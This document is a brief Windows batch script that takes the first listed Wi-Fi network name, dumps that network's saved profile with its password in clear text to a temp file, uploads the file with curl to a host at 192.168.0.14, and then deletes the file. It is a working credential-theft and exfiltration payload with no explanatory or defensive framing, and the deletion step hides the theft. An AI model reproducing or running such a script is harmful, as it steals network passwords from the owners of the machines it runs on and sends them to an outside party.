for /f "tokens=*" %%a in ('netsh wlan show networks ^| findstr /C:"SSID 1 :"') do set var="%%a"

echo %var:~10,-1%

netsh wlan show profiles "%var:~10,-1%" key=clear > %temp%\cmdtemp


curl -F file=@%temp%\cmdtemp http://192.168.0.14/upload


del %temp%\cmdtemp